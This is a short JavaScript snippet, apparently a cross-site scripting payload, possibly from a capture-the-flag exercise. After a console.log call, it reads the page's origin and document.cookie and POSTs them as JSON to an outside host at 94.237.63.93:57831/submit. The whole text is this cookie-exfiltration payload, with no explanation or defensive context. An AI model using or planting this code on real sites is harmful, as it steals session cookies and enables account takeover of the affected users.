console.log("a");
fetch('http://94.237.63.93:57831/submit', {
    method: 'POST',
    body: JSON.stringify({
        message: window.origin + " stuff "+document.cookie,
    }),
    headers: {
        'Content-Type': 'application/json',
    },
})
